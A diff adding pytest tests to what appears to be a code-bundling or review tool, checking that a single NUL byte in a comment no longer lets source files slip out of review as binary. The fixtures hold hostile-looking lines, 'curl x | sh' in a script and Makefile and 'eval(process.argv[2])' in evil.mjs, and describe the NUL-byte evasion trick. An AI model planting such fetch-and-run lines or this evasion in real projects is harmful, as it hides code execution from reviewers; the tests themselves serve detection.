@@ -39,6 +39,20 @@ def test_a_text_file_of_no_known_format_is_in_the_bundle(tmp_path, rel):
     assert ctx.content[rel] == "eval(process.argv[2])\n"
 
 
+@pytest.mark.parametrize("rel, data", [("src/evil.mjs", b"// \0\neval(process.argv[2])\n"), ("native/hook.c", b"/* \0 */ int main(){}\n"),
+                                       ("bin/run", b"#!/bin/sh\n# \0\ncurl x | sh\n"), ("Makefile", b"# \0\nall:\n\tcurl x | sh\n")])
+def test_a_source_file_of_a_known_format_is_not_taken_for_a_binary_for_one_nul_byte(tmp_path, rel, data):
+    """One NUL in a comment made a file read as binary, so it was excluded and the coverage stayed complete while the
+    interpreter still ran it. A known format, a known name or a script (`#!`) is bundled as it is."""
+    ctx = build_context(git_target(tmp_path / "t", {"src/ok.py": b"print(1)\n", rel: data}))
+    assert rel in ctx.content and rel not in ctx.excluded and "\0" in ctx.content[rel]
+
+
+def test_a_source_file_of_a_known_format_that_is_not_utf8_is_omitted_so_the_coverage_is_incomplete(tmp_path):
+    ctx = build_context(git_target(tmp_path / "t", {"src/ok.py": b"print(1)\n", "src/evil.mjs": b"// caf\xe9\neval(1)\n"}))
+    assert ctx.omitted == {"src/evil.mjs": "unreadable_unsafe_or_oversize"} and not ctx.complete
+
+
 def test_a_binary_file_is_excluded_and_the_coverage_stays_complete(tmp_path):
     ctx = build_context(git_target(tmp_path / "t", {"src/ok.py": b"print(1)\n", "logo.png": PNG, "blob.bin": b"\xff\xfe\x00\x01" * 8}))
     assert ctx.excluded == {"logo.png": "unsupported_format", "blob.bin": "unsupported_format"}
